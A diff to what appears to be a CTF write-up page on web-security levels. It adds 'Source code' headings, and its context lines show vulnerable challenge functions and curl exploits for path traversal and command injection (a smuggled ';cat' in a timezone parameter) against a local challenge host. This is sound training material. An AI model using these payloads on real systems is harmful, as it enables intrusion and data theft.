@@ -9,6 +9,7 @@ sidebar_position: 9
 
 > Exploit a path traversal vulnerability
 
+### Source code
 ```py title="level 1 source code"
 def level1():
     path = request.args.get("path")
@@ -30,6 +31,7 @@ hacker@web-security~level1:/$ curl 'http://challenge.localhost/?path=/flag'
 
 > Exploit a command injection vulnerability
 
+### Source code
 ```py title="level 2 source code"
 def level2():
     timezone = request.args.get("timezone", "UTC")
@@ -170,6 +172,7 @@ hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bcat%
 
 > Exploit an authentication bypass vulnerability
 
+### Source code
 ```py title="level 3 source code"
 def level3():
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
@@ -231,6 +234,7 @@ hacker@web-security~level3:/$ curl 'http://challenge.localhost/?user=1'
 
 > Exploit a structured query language injection vulnerability to login
 
+### Source code
 ```py title="level 4 source code"
 def level4():
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
@@ -364,6 +368,7 @@ print(response.text)
 
 > Exploit a structured query language injection vulnerability to leak data
 
+### Source code
 ```py title="level 5 source code"
 def level5():
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
@@ -427,6 +432,7 @@ print(response.text)
 
 > Exploit a structured query language injection vulnerability with an unknown database structure
 
+### Source code
 ```py title="level 6 source code"
 def level6():
     table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
@@ -576,7 +582,8 @@ print(response.text)
 
 > Exploit a structured query language injection vulnerability to blindly leak data
 
-```py
+### Source code
+```py title="level 7 source code"
 def level7():
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                 'SELECT "flag" AS username, ? as password'),
@@ -684,6 +691,7 @@ if not found:
 
 > Exploit a cross site scripting vulnerability
 
+### Source code
 ```py title="level 8 source code"
 def level8():
     if request.path == "/echo":
@@ -739,6 +747,7 @@ print(response.text)
 
 > Exploit a cross site scripting vulnerability with more complicated context
 
+### Source code
 ```py title="level 9 source code"
 def level9():
     if request.path == "/echo":
@@ -800,6 +809,7 @@ print(response.text)
 
 > Exploit a cross site scripting vulnerability to cause a user action
 
+### Source code
 ```py title="level 10 source code"
 def level10():
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
